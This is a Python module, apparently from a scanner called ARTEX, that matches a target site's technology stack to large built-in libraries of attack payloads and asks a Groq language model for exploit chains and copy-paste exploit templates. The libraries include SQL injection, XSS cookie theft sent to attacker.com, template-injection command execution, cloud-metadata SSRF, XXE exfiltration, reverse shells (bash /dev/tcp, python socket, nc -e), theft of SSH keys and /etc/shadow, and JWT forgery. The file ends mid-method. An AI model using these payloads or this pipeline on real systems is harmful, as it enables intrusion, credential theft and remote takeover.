# AI_payload_generator.py
# reads: scan_results['tech_detection'], scan_results['port_scan'],
#        scan_results['ssl_scan'], scan_results['header_analysis'] (if present)

import json
import time
import re
import logging
import requests
import random
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Set
from itertools import product as itertools_product


# ---------------------------------------------------------------------------
# Payload libraries — deterministic, no AI needed for base generation
# ---------------------------------------------------------------------------

# ── SQLi ────────────────────────────────────────────────────────────────────

SQLI_PAYLOADS: Dict[str, List[str]] = {
    "error_based_mysql": [
        "' AND extractvalue(1,concat(0x7e,version()))-- -",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
        "' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -",
        "1' AND (SELECT * FROM (SELECT(SLEEP(0)))a) AND '1'='1",
    ],
    "error_based_mssql": [
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -",
        "'; EXEC xp_cmdshell('whoami')-- -",
        "' UNION SELECT NULL,@@version,NULL,NULL-- -",
        "'; WAITFOR DELAY '0:0:5'-- -",
    ],
    "error_based_postgres": [
        "' AND 1=CAST((SELECT version()) AS int)-- -",
        "'; SELECT pg_sleep(5)-- -",
        "' UNION SELECT NULL,current_user,NULL-- -",
        "' AND 1=(SELECT 1 FROM pg_sleep(5))-- -",
    ],
    "error_based_oracle": [
        "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
        "' UNION SELECT NULL,user,NULL FROM dual-- -",
        "' AND 1=ctxsys.drithsx.sn(1,(SELECT user FROM dual))-- -",
    ],
    "blind_boolean": [
        "' AND 1=1-- -",
        "' AND 1=2-- -",
        "' AND SUBSTRING(version(),1,1)='5'-- -",
        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- -",
        "1 AND 1=1",
        "1 AND 1=2",
        "' OR '1'='1",
        "' OR '1'='2",
    ],
    "blind_time": [
        "' AND SLEEP(5)-- -",
        "'; WAITFOR DELAY '0:0:5'-- -",
        "' AND 1=(SELECT 1 FROM pg_sleep(5))-- -",
        "' OR SLEEP(5)-- -",
        "1; SELECT SLEEP(5)-- -",
    ],
    "union_generic": [
        "' UNION SELECT NULL-- -",
        "' UNION SELECT NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
        "' UNION ALL SELECT NULL,table_name,NULL FROM information_schema.tables-- -",
    ],
    "waf_bypass": [
        "' /*!50000UNION*/ /*!50000SELECT*/ NULL,version(),NULL-- -",
        "'/**/UNION/**/SELECT/**/NULL,version(),NULL-- -",
        "' UNION%0aSELECT%0aNULL,version(),NULL-- -",
        "';%09EXEC%09xp_cmdshell('whoami')-- -",
        "1'/**/AND/**/(SELECT/**/*/**/FROM/**/users)>0-- -",
        "' uNiOn SeLeCt NULL,version(),NULL-- -",
    ],
    "out_of_band": [
        "'; EXEC master..xp_dirtree '//attacker.com/a'-- -",
        "' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\share'))-- -",
        "' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL-- -",
    ],
}

# ── XSS ─────────────────────────────────────────────────────────────────────

XSS_PAYLOADS: Dict[str, List[str]] = {
    "basic": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "<body onload=alert(1)>",
    ],
    "attribute_breakout": [
        "\" onmouseover=\"alert(1)",
        "' onmouseover='alert(1)",
        "\" autofocus onfocus=\"alert(1)",
        "\" style=\"animation-name:x\" onanimationstart=\"alert(1)",
        "><script>alert(1)</script>",
        "'><img src=x onerror=alert(1)>",
    ],
    "dom_based": [
        "#<img src=x onerror=alert(1)>",
        "#\"><img src=x onerror=alert(1)>",
        "javascript:void(0)/**/;alert(1)",
        "#';alert(1)//",
    ],
    "filter_bypass": [
        "<ScRiPt>alert(1)</ScRiPt>",
        "<script >alert(1)</script >",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<<SCRIPT>alert(1)//<</SCRIPT>",
        "<svg><script>alert(1)</script></svg>",
        "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
        "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        "\"><svg onload=alert(1)//",
    ],
    "csp_bypass": [
        "<script src='https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.1.1/angular.js'></script><div ng-app ng-csp><input autofocus ng-focus=\"$event.composedPath()|orderBy:'[].constructor.from([1], alert)'\"d>",
        "<link rel=preload as=script href=//attacker.com/xss.js>",
        "<script nonce='STEAL_NONCE'>alert(1)</script>",
        "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'unsafe-inline'\">",
    ],
    "stored_exfil": [
        "<script>fetch('https://attacker.com/'+document.cookie)</script>",
        "<img src=x onerror=\"this.src='https://attacker.com/c='+document.cookie\">",
        "<svg onload=\"navigator.sendBeacon('https://attacker.com',document.cookie)\">",
        "<script>var i=new Image;i.src='https://attacker.com/?c='+encodeURIComponent(document.cookie);</script>",
        "<script>fetch('https://attacker.com',{method:'POST',body:JSON.stringify(localStorage)})</script>",
    ],
    "waf_bypass": [
        "<details open ontoggle=alert(1)>",
        "<video src=1 onerror=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<keygen autofocus onfocus=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<object data=javascript:alert(1)>",
    ],
}

# ── SSTI ─────────────────────────────────────────────────────────────────────

SSTI_PAYLOADS: Dict[str, List[str]] = {
    "detection_polyglot": [
        "${{<%[%'\"}}%\\.",
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "*{7*7}",
        "@(7*7)",
    ],
    "jinja2_python": [
        "{{7*'7'}}",
        "{{config}}",
        "{{config.items()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{''.join(__import__('os').popen('id').read())}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        "{{joiner.__init__.__globals__.os.popen('id').read()}}",
        "{{namespace.__init__.__globals__.os.popen('id').read()}}",
    ],
    "twig_php": [
        "{{7*7}}",
        "{{dump(app)}}",
        "{{app.request.server.all|join(',')}}",
        "{{'id'|filter('system')}}",
        "{{['id']|map('system')|join}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    ],
    "freemarker_java": [
        "${7*7}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
    ],
    "velocity_java": [
        "#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('id')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
    ],
    "smarty_php": [
        "{php}echo `id`;{/php}",
        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
    ],
    "pebble_java": [
        "{{'' | upper}}",
        "{%- set cmd = 'id' -%}{{\"\" | upper}}{%for i in range(1)%}{{i.getClass().forName(\"java.lang.Runtime\").getMethod(\"exec\",i.getClass().forName(\"java.lang.String\")).invoke(i.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),cmd)}}{% endfor %}",
    ],
    "erb_ruby": [
        "<%= 7*7 %>",
        "<%= `id` %>",
        "<%= system('id') %>",
        "<%= IO.popen('id').readlines() %>",
    ],
    "el_java": [
        "${pageContext.request.getSession().setAttribute(\"a\",pageContext.request.getClass().forName(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(pageContext.request.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),\"id\"))}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "#{T(java.lang.Runtime).getRuntime().exec('id')}",
    ],
}

# ── SSRF ─────────────────────────────────────────────────────────────────────

SSRF_PAYLOADS: Dict[str, List[str]] = {
    "internal_probes": [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://0.0.0.0/",
        "http://[::1]/",
        "http://169.254.169.254/",                               # AWS IMDS
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
        "http://100.100.100.200/latest/meta-data/",             # Alibaba
    ],
    "filter_bypass": [
        "http://127.1/",
        "http://127.0.1/",
        "http://0x7f000001/",
        "http://2130706433/",
        "http://017700000001/",
        "http://127.000.000.001/",
        "http://[0:0:0:0:0:ffff:127.0.0.1]/",
        "http://①②⑦.⓪.⓪.①/",
        "http://127.0.0.1.xip.io/",
        "http://1.2.3.4.127.0.0.1.nip.io/",
    ],
    "protocol_smuggling": [
        "dict://127.0.0.1:11211/stat",
        "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A",
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "sftp://attacker.com:11111/",
        "ldap://attacker.com:11211/%0astats%0aquit",
        "tftp://attacker.com:12346/TESTUDPPACKET",
    ],
    "cloud_imds": [
        "http://169.254.169.254/latest/user-data",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://169.254.169.254/latest/meta-data/public-keys/",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env",
        "http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01",
    ],
    "open_redirect_chain": [
        "//attacker.com",
        "///attacker.com",
        "////attacker.com",
        "https:attacker.com",
        "/\\/attacker.com",
        "http://attacker.com@trusted.com",
    ],
}

# ── XXE ─────────────────────────────────────────────────────────────────────

XXE_PAYLOADS: Dict[str, List[str]] = {
    "basic_file_read": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>',
    ],
    "oob_exfil": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">%remote;%init;%trick;]><root/>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><data>&send;</data>',
    ],
    "blind_ssrf": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/ssrf">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://169.254.169.254/latest/meta-data/">%remote;]><root/>',
    ],
    "soap_injection": [
        '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data></soap:Body></soap:Envelope>',
    ],
    "xinclude": [
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://attacker.com/ssrf"/></foo>',
    ],
}

# ── Command Injection ────────────────────────────────────────────────────────

CMDI_PAYLOADS: Dict[str, List[str]] = {
    "unix_basic": [
        "; id",
        "| id",
        "|| id",
        "&& id",
        "& id",
        "`id`",
        "$(id)",
        "; id #",
        "\nid\n",
        "; cat /etc/passwd",
    ],
    "windows_basic": [
        "| whoami",
        "|| whoami",
        "&& whoami",
        "& whoami",
        "; whoami",
        "| dir c:\\",
        "& type c:\\windows\\win.ini",
    ],
    "blind_oob": [
        "; curl http://attacker.com/`id`",
        "; wget -q -O- http://attacker.com/`id`",
        "; nslookup `id`.attacker.com",
        "; ping -c 1 attacker.com",
        "| curl http://attacker.com/$(id|base64)",
        "; curl http://169.254.169.254/latest/meta-data/ | curl -d @- http://attacker.com/",
    ],
    "filter_bypass": [
        ";c''at /etc/pass''wd",
        ";c'a't /etc/pa'ss'wd",
        ";ca$()t /etc/passwd",
        ";c${IFS}at${IFS}/etc/passwd",
        ";{cat,/etc/passwd}",
        ";cat${IFS}/etc/passwd",
        "|bas''e64 /etc/passwd",
        ";/bin/ca*t /etc/passwd",
        ";/???/??t /???/passwd",
    ],
    "reverse_shell": [
        "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
        "; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "; nc attacker.com 4444 -e /bin/sh",
        "; /bin/sh -i >& /dev/udp/attacker.com/4444 0>&1",
    ],
}

# ── Path Traversal ──────────────────────────────────────────────────────────

PATH_TRAVERSAL_PAYLOADS: Dict[str, List[str]] = {
    "unix": [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../etc/shadow",
        "../../../etc/hosts",
        "../../../proc/self/environ",
        "../../../proc/self/cmdline",
        "../../../var/log/apache2/access.log",
        "../../../var/log/nginx/access.log",
        "../../../home/$USER/.ssh/id_rsa",
        "../../../root/.ssh/id_rsa",
    ],
    "windows": [
        "..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "..\\..\\..\\boot.ini",
        "../../../../windows/win.ini",
        "../../../windows/system32/drivers/etc/hosts",
    ],
    "encoded": [
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
        "....//....//....//etc/passwd",
        "..;/..;/..;/etc/passwd",
    ],
    "null_byte": [
        "../../../etc/passwd%00",
        "../../../etc/passwd%00.jpg",
        "../../../etc/passwd\x00.jpg",
        "../../../etc/passwd%00index.html",
    ],
}

# ── Open Redirect ───────────────────────────────────────────────────────────

OPEN_REDIRECT_PAYLOADS: List[str] = [
    "//attacker.com",
    "///attacker.com",
    "////attacker.com",
    "https://attacker.com",
    "http://attacker.com",
    "/\\/attacker.com",
    "//attacker.com/%2F..",
    "http://attacker.com@trusted.com",
    "http://trusted.com.attacker.com",
    "/redirect?url=https://attacker.com",
    "javascript:window.location='https://attacker.com'",
    "%0d%0aLocation:%20https://attacker.com",
    "https:attacker.com",
]

# ── IDOR ────────────────────────────────────────────────────────────────────

IDOR_PROBES: Dict[str, List[str]] = {
    "numeric_manipulation": [
        "0", "1", "2", "100", "999", "9999", "99999",
        "-1", "-100",
        "0000001", "000000000000000001",
    ],
    "uuid_patterns": [
        "00000000-0000-0000-0000-000000000001",
        "00000000-0000-0000-0000-000000000000",
    ],
    "parameter_pollution": [
        "id=1&id=2",
        "user_id=1&user_id=VICTIM",
        "account=self&account=victim@corp.com",
    ],
    "method_bypass": [
        "GET → PUT",
        "POST → PATCH",
        "Add X-HTTP-Method-Override: PUT",
        "Add X-Method-Override: DELETE",
    ],
}

# ── NoSQL Injection ─────────────────────────────────────────────────────────

NOSQL_PAYLOADS: Dict[str, List[str]] = {
    "mongodb_auth_bypass": [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$ne": "invalid"}',
        '{"$regex": ".*"}',
        '{"$exists": true}',
        "' || '1'=='1",
        "'; return true; var dummy='",
        "admin' || 'a'=='a",
    ],
    "mongodb_extraction": [
        '{"$where": "this.password.match(/a/)"}',
        '{"$where": "sleep(5000) || true"}',
        '{"$regex": "^a"}',
        '{"$regex": "^b"}',
    ],
    "php_mongo_operator": [
        "login[username][$ne]=admin&login[password][$ne]=invalid",
        "username[$regex]=.*&password[$regex]=.*",
        "username[$ne]=notadmin&password[$gt]=",
    ],
    "js_injection": [
        "'; while(1) //",
        "'&&this.constructor.constructor('return process.env.NODE_ENV')()=='",
        "' + this.constructor.constructor('return process.env')() + '",
    ],
}

# ── GraphQL ─────────────────────────────────────────────────────────────────

GRAPHQL_PAYLOADS: Dict[str, List[str]] = {
    "introspection": [
        '{"query":"{__schema{types{name}}}"}',
        '{"query":"{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}',
    ],
    "batch_brute": [
        '[{"query":"mutation{login(user:\\"admin\\",password:\\"a\\")}"},{"query":"mutation{login(user:\\"admin\\",password:\\"b\\")}"}]',
    ],
    "dos_circular": [
        '{"query":"{user{friends{friends{friends{friends{friends{id name}}}}}}}"}',
    ],
    "field_suggestion": [
        '{"query":"{__type(name:\\"User\\"){fields{name type{name}}}}"}',
    ],
    "nosql_via_graphql": [
        '{"query":"{ user(id: \\"1 OR 1=1\\") { name email } }"}',
        '{"query":"mutation { login(username: \\"admin\\", password: \\"{$gt: \\"\\"}\\") { token } }"}',
    ],
}

# ── HTTP Request Smuggling ───────────────────────────────────────────────────

SMUGGLING_PAYLOADS: Dict[str, str] = {
    "CL_TE": (
        "POST / HTTP/1.1\r\n"
        "Host: TARGET\r\n"
        "Content-Length: 13\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "SMUGGLED"
    ),
    "TE_CL": (
        "POST / HTTP/1.1\r\n"
        "Host: TARGET\r\n"
        "Content-Length: 3\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "8\r\n"
        "SMUGGLED\r\n"
        "0\r\n"
        "\r\n"
    ),
    "TE_TE_obfuscation": (
        "POST / HTTP/1.1\r\n"
        "Host: TARGET\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Transfer-Encoding : chunked\r\n"  # space before colon
        "Content-Length: 6\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
    ),
}

# ── JWT ─────────────────────────────────────────────────────────────────────

JWT_ATTACKS: Dict[str, str] = {
    "alg_none": (
        "# Change header: {\"alg\":\"none\",\"typ\":\"JWT\"}\n"
        "# Remove signature — send: header.payload.\n"
        "# b64url('{\"alg\":\"none\"}').b64url(payload)."
    ),
    "rs256_to_hs256": (
        "# Grab server's RS256 public key\n"
        "# Re-sign token using HS256 with the PUBLIC KEY as HMAC secret\n"
        "import jwt, base64\n"
        "pub = open('pub.pem').read()\n"
        "fake = jwt.encode(payload, pub, algorithm='HS256')"
    ),
    "kid_sqli": (
        "# kid header injection:\n"
        "{ \"alg\": \"HS256\", \"kid\": \"' UNION SELECT 'attacker_secret' -- -\" }\n"
        "# Sign token with 'attacker_secret' as HMAC key"
    ),
    "jwk_injection": (
        "# Embed attacker-controlled JWK in token header:\n"
        '{ "alg": "RS256", "jwk": { "kty": "RSA", "n": "ATTACKER_N", "e": "AQAB" } }\n'
        "# Sign with attacker private key matching embedded JWK"
    ),
    "jku_injection": (
        "# Set jku to attacker-controlled URL hosting JWKS:\n"
        '{ "alg": "RS256", "jku": "https://attacker.com/jwks.json" }\n'
        "# Host JWKS with attacker public key, sign with matching private key"
    ),
}

# ── CSRF ─────────────────────────────────────────────────────────────────────

CSRF_TEMPLATES: Dict[str, str] = {
    "form_post": (
        '<html><body>\n'
        '<form action="https://TARGET/api/action" method="POST">\n'
        '  <input type="hidden" name="param" value="evil_value">\n'
        '</form>\n'
        '<script>document.forms[0].submit();</script>\n'
        '</body></html>'
    ),
    "json_csrf_fetch": (
        '<html><body><script>\n'
        "fetch('https://TARGET/api/action', {\n"
        "  method: 'POST',\n"
        "  credentials: 'include',\n"
        "  headers: {'Content-Type': 'application/json'},\n"
        "  body: JSON.stringify({param: 'evil_value'})\n"
        "})\n"
        '</script></body></html>'
    ),
    "cors_csrf": (
        '<html><body><script>\n'
        "var xhr = new XMLHttpRequest();\n"
        "xhr.open('POST', 'https://TARGET/api/action', true);\n"
        "xhr.withCredentials = true;\n"
        "xhr.setRequestHeader('Content-Type', 'text/plain');\n"
        "xhr.send('param=evil_value');\n"
        '</script></body></html>'
    ),
}

# ── WordPress specific ───────────────────────────────────────────────────────

WORDPRESS_PAYLOADS: Dict[str, List[str]] = {
    "enumeration": [
        "/?author=1",
        "/?author=2",
        "/wp-json/wp/v2/users",
        "/wp-json/wp/v2/posts",
        "/?feed=rss2",
        "/xmlrpc.php",
        "/wp-admin/",
        "/wp-login.php",
        "/wp-content/debug.log",
        "/.git/config",
    ],
    "xmlrpc_bruteforce": [
        (
            '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName>'
            '<params><param><value>admin</value></param>'
            '<param><value>password</value></param></params></methodCall>'
        ),
        (
            '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName>'
            '<params><param><value><array><data>'
            '<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>'
            '<member><name>params</name><value><array><data>'
            '<value><array><data><value>admin</value><value>password</value></data></array></value>'
            '</data></array></value></member></struct></value>'
            '</data></array></value></param></params></methodCall>'
        ),
    ],
}


# ---------------------------------------------------------------------------
# Tech → vuln class mapping
# ---------------------------------------------------------------------------

TECH_VULN_MAP: Dict[str, List[str]] = {
    # Web servers
    "nginx":      ["path_traversal", "ssrf", "http_request_smuggling", "open_redirect"],
    "apache":     ["path_traversal", "ssrf", "http_request_smuggling", "cmdi"],
    "iis":        ["path_traversal", "ssrf", "http_request_smuggling"],
    "caddy":      ["ssrf", "open_redirect"],
    "litespeed":  ["path_traversal", "ssrf"],
    # Languages / frameworks
    "php":        ["sqli", "xss", "cmdi", "path_traversal", "xxe", "ssti_twig", "ssti_smarty"],
    "python":     ["sqli", "xss", "ssti_jinja2", "ssrf", "cmdi"],
    "django":     ["sqli", "xss", "ssti_jinja2", "csrf", "ssrf"],
    "flask":      ["sqli", "xss", "ssti_jinja2", "ssrf"],
    "ruby":       ["sqli", "xss", "ssti_erb", "cmdi"],
    "rails":      ["sqli", "xss", "ssti_erb", "csrf"],
    "node.js":    ["sqli", "xss", "nosql", "ssrf", "ssti_pebble", "cmdi"],
    "express":    ["sqli", "xss", "nosql", "ssrf"],
    "java":       ["sqli", "xxe", "ssrf", "ssti_freemarker", "ssti_velocity", "ssti_el", "cmdi"],
    "spring":     ["sqli", "xxe", "ssrf", "ssti_el", "cmdi"],
    "asp.net":    ["sqli", "xss", "xxe", "path_traversal", "http_request_smuggling"],
    # CMS
    "wordpress":  ["sqli", "xss", "wordpress_enum", "path_traversal", "xxe"],
    "joomla":     ["sqli", "xss", "path_traversal"],
    "drupal":     ["sqli", "xss", "ssrf"],
    "magento":    ["sqli", "xss", "xxe"],
    # Databases
    "mysql":      ["sqli_mysql"],
    "postgresql": ["sqli_postgres"],
    "mssql":      ["sqli_mssql"],
    "oracle":     ["sqli_oracle"],
    "mongodb":    ["nosql"],
    # Auth
    "jwt":        ["jwt_attacks"],
    "graphql":    ["graphql"],
    "xml":        ["xxe"],
}

SSTI_ENGINE_MAP: Dict[str, str] = {
    "django":     "jinja2_python",
    "flask":      "jinja2_python",
    "jinja2":     "jinja2_python",
    "php":        "twig_php",
    "twig":       "twig_php",
    "smarty":     "smarty_php",
    "freemarker": "freemarker_java",
    "velocity":   "velocity_java",
    "pebble":     "pebble_java",
    "ruby":       "erb_ruby",
    "erb":        "erb_ruby",
    "java":       "el_java",
    "spring":     "el_java",
}


# ---------------------------------------------------------------------------
# Main class
# ---------------------------------------------------------------------------

class AIPayloadGenerator:
    """
    Context-aware payload generator for ARTEX.

    Pass 1 — rule-based: reads tech_detection + port_scan + ssl_scan from
             existing scan_results, maps detected stack to relevant vuln
             classes, selects + annotates payloads for each class.
    Pass 2 — Groq AI: receives the tech profile and payload set, returns
             a prioritised exploit chain, WAF bypass notes, and
             copy-paste ready exploit templates.

    Slot in run_scan() after tech_detection block:
        generator = AIPayloadGenerator(groq_api_key=GROQ_API_KEY)
        scan_results[scan_id]['payload_analysis'] = generator.generate(
            domain=domain,
            scan_results=scan_results[scan_id],
        )
    """

    def __init__(
        self,
        groq_api_key: Optional[str] = None,
        timeout: int = 10,
    ):
        self.groq_api_key = groq_api_key
        self.timeout      = timeout
        self.logger       = logging.getLogger(__name__)

        if not self.logger.handlers:
            h = logging.StreamHandler()
            h.setFormatter(logging.Formatter(
                "%(asctime)s [%(levelname)s] %(name)s — %(message)s"
            ))
            self.logger.addHandler(h)
            self.logger.setLevel(logging.INFO)

    # ------------------------------------------------------------------
    # Public entry point
    # ------------------------------------------------------------------

    def generate(
        self,
        domain: str,
        scan_results: Optional[Dict] = None,
        manual_tech: Optional[List[str]] = None,
    ) -> Dict:
        """
        Args:
            domain:       Target domain string.
            scan_results: Full ARTEX scan_results dict. Module reads:
                          tech_detection, port_scan, ssl_scan,
                          header_analysis (optional).
            manual_tech:  Override — manually specify tech list when
                          scan_results not available (e.g. ['php','mysql']).

        Returns dict with keys:
            tech_profile          — detected stack + classified vuln classes
            payloads              — per-vuln-class payload sets
            waf_detected          — bool + WAF name if found
            injection_points      — likely injection surfaces from context
            ai_analysis           — Groq exploit chain + priority (or None)
            scan_metadata
        """
        self.logger.info(f"Payload generation starting — domain: {domain}")
        start = time.time()

        # Step 1 — extract tech stack
        tech_profile = self._build_tech_profile(scan_results, manual_tech)
        self.logger.info(
            f"Tech profile: {tech_profile['detected_tech'][:8]}"
        )

        # Step 2 — map stack to vuln classes
        vuln_classes = self._map_vuln_classes(tech_profile)
        self.logger.info(f"Vuln classes mapped: {vuln_classes}")

        # Step 3 — detect WAF
        waf_info = self._detect_waf(scan_results)

        # Step 4 — build injection point inventory
        injection_points = self._build_injection_points(domain, scan_results)

        # Step 5 — select payloads per class
        payloads = self._select_payloads(
            vuln_classes, tech_profile, waf_info, injection_points
        )

        # Step 6 — AI enrichment
        ai_result = None
        if self.groq_api_key:
            ai_result = self._ai_analysis(
                domain, tech_profile, vuln_classes,
                waf_info, injection_points, payloads
            )

        duration = round(time.time() - start, 2)
        self.logger.info(f"Payload generation complete in {duration}s")

        return {
            "tech_profile":      tech_profile,
            "vuln_classes":      vuln_classes,
            "waf_detected":      waf_info,
            "injection_points":  injection_points,
            "payloads":          payloads,
            "ai_analysis":       ai_result,
            "scan_metadata": {
                "domain":                domain,
                "scan_duration_seconds": duration,
                "timestamp":             datetime.now().isoformat(),
                "ai_model":              "Groq Llama3-70B" if ai_result else "Rule-based only",
                "total_payloads":        sum(
                    len(v) for v in payloads.values() if isinstance(v, list)
                ),
            },
        }

    # ------------------------------------------------------------------
    # Tech profile extraction
    # ------------------------------------------------------------------

    def _build_tech_profile(
        self,
        scan_results: Optional[Dict],
        manual_tech: Optional[List[str]],
    ) -> Dict:
        profile: Dict = {
            "detected_tech":  [],
            "web_server":     None,
            "language":       None,
            "framework":      None,
            "cms":            None,
            "database":       None,
            "cdn_waf":        [],
            "open_ports":     [],
            "ssl_version":    None,
            "cookies":        [],
            "response_headers": {},
            "raw_tech_names": set(),
        }

        if manual_tech:
            profile["detected_tech"] = [t.lower() for t in manual_tech]
            profile["raw_tech_names"] = set(profile["detected_tech"])
            return profile

        if not scan_results:
            return profile

        # ── From tech_detection ──────────────────────────────────────────
        tech_detection = scan_results.get("tech_detection", {})
        for url, tech_data in tech_detection.items():
            for tech in tech_data.get("technologies", []):
                name    = tech.get("name", "").lower()
                version = tech.get("version") or ""
                cat     = tech.get("category", "").lower()

                if not name:
                    continue

                profile["raw_tech_names"].add(name)
                entry = {"name": name, "version": version, "category": cat, "url": url}

                if entry not in profile["detected_tech"]:
                    profile["detected_tech"].append(entry)

                # Categorise
                if any(s in name for s in ["nginx", "apache", "iis", "litespeed", "caddy"]):
                    profile["web_server"] = profile["web_server"] or f"{name} {version}".strip()

                if any(s in name for s in ["php", "python", "ruby", "java", "node", "asp.net", ".net"]):
                    profile["language"] = profile["language"] or f"{name} {version}".strip()

                if any(s in name for s in ["django", "flask", "laravel", "rails", "spring", "express", "wordpress", "joomla", "drupal"]):
                    profile["framework"] = profile["framework"] or f"{name} {version}".strip()
                    if any(c in name for c in ["wordpress", "joomla", "drupal", "magento"]):
                        profile["cms"] = f"{name} {version}".strip()

                if any(s in name for s in ["mysql", "postgresql", "mssql", "oracle", "mongodb", "redis", "elasticsearch"]):
                    profile["database"] = profile["database"] or f"{name} {version}".strip()

